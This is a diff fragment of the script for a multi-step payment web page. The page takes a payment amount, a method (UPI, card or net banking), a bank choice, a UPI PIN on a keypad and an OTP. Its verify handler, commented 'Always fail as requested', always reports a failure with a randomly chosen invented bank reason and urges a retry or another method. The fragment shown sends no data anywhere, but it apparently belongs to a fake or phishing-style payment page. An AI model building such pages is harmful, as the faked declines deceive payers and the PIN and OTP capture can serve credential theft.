+                        c.classList.remove('selected');
+                    });
+                    this.classList.add('selected');
+                    selectedProblem = this.getAttribute('data-value');
+                    
+                    // Auto-navigate to next page after selection
+                    setTimeout(() => {
+                        goToPage(parseInt(this.getAttribute('data-next')));
+                    }, 300);
+                });
+            });
+            
+            // Page 3: Payment Amount
+            const paymentAmountInput = document.getElementById('paymentAmount');
+            paymentAmountInput.addEventListener('input', function() {
+                paymentAmount = this.value || 5;
+            });
+            
+            // Page 4: Payment Method Selection
+            document.querySelectorAll('.payment-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    document.querySelectorAll('.payment-option').forEach(o => {
+                        o.classList.remove('selected');
+                    });
+                    this.classList.add('selected');
+                    selectedPaymentMethod = this.getAttribute('data-method');
+                    
+                    // Auto-navigate to next page after selection
+                    setTimeout(() => {
+                        goToPage(parseInt(this.getAttribute('data-next')));
+                    }, 300);
+                });
+            });
+            
+            // Bank Selection
+            document.querySelectorAll('.featured-bank, .bank-item').forEach(bank => {
+                bank.addEventListener('click', function() {
+                    document.querySelectorAll('.featured-bank, .bank-item').forEach(b => {
+                        b.classList.remove('selected');
+                    });
+                    this.classList.add('selected');
+                    selectedBank = this.getAttribute('data-bank');
+                });
+            });
+            
+            // UPI Keypad functionality
+            document.querySelectorAll('.key').forEach(key => {
+                key.addEventListener('click', function() {
+                    const upiPinInput = document.getElementById('upiPin');
+                    
+                    if (this.textContent === '0' || this.textContent === '1' || 
+                        this.textContent === '2' || this.textContent === '3' || 
+                        this.textContent === '4' || this.textContent === '5' || 
+                        this.textContent === '6' || this.textContent === '7' || 
+                        this.textContent === '8' || this.textContent === '9') {
+                        
+                        if (upiPinInput.value.length < 6) {
+                            upiPinInput.value += this.textContent;
+                        }
+                    } else if (this.querySelector('.fa-backspace')) {
+                        upiPinInput.value = upiPinInput.value.slice(0, -1);
+                    }
+                });
+            });
+            
+            // OTP Input auto focus
+            const otpDigits = document.querySelectorAll('.otp-digit');
+            otpDigits.forEach((digit, index) => {
+                digit.addEventListener('input', function() {
+                    if (this.value.length === 1 && index < otpDigits.length - 1) {
+                        otpDigits[index + 1].focus();
+                    }
+                });
+                
+                digit.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                        otpDigits[index - 1].focus();
+                    }
+                });
+            });
+            
+            // Failure reasons array
+            const failureReasons = [
+                "Insufficient funds in account",
+                "Transaction declined by bank",
+                "Network error - please try again",
+                "OTP validation failed",
+                "Temporary service outage",
+                "Account transaction limit exceeded"
+            ];
+            
+            // Navigation event listeners
+            document.getElementById('nextToPage3').addEventListener('click', () => goToPage(3));
+            document.getElementById('nextToPage4').addEventListener('click', () => goToPage(4));
+            
+            document.getElementById('processUpiPayment').addEventListener('click', () => goToPage(9));
+            document.getElementById('processCardPayment').addEventListener('click', () => goToPage(9));
+            document.getElementById('processNetBanking').addEventListener('click', () => goToPage(8));
+            document.getElementById('processTransaction').addEventListener('click', () => goToPage(9));
+            
+            document.getElementById('verifyOtp').addEventListener('click', () => {
+                // Always fail as requested
+                const randomReason = failureReasons[Math.floor(Math.random() * failureReasons.length)];
+                document.getElementById('failureReason').textContent = randomReason;
+                goToPage(10);
+            });
+            
+            // Back button event listeners
+            document.getElementById('backToPage1').addEventListener('click', () => goToPage(1));
+            document.getElementById('backToPage2').addEventListener('click', () => goToPage(2));
+            document.getElementById('backToPage3').addEventListener('click', () => goToPage(3));
+            document.getElementById('backToPage4').addEventListener('click', () => goToPage(4));
+            document.getElementById('backToPage4FromCard').addEventListener('click', () => goToPage(4));
+            document.getElementById('backToPage4FromNet').addEventListener('click', () => goToPage(4));
+            document.getElementById('backToPage7').addEventListener('click', () => goToPage(7));
+            document.getElementById('backToPaymentMethod').addEventListener('click', () => {
+                if (selectedPaymentMethod === 'upi') goToPage(5);
+                else if (selectedPaymentMethod === 'debit' || selectedPaymentMethod === 'credit') goToPage(6);
+                else if (selectedPaymentMethod === 'netbanking') goToPage(7);
+            });
+            
+            document.getElementById('tryAnotherMethod').addEventListener('click', () => goToPage(4));
+            document.getElementById('retryPayment').addEventListener('click', () => {
+                if (selectedPaymentMethod === 'upi') goToPage(5);
+                else if (selectedPaymentMethod === 'debit' || selectedPaymentMethod === 'credit') goToPage(6);
+                else if (selectedPaymentMethod === 'netbanking') goToPage(7);
+            });
+            
+            // Initialize progress bar
+            updateProgress();
+        });
+    </script>
+</body>
+</html>
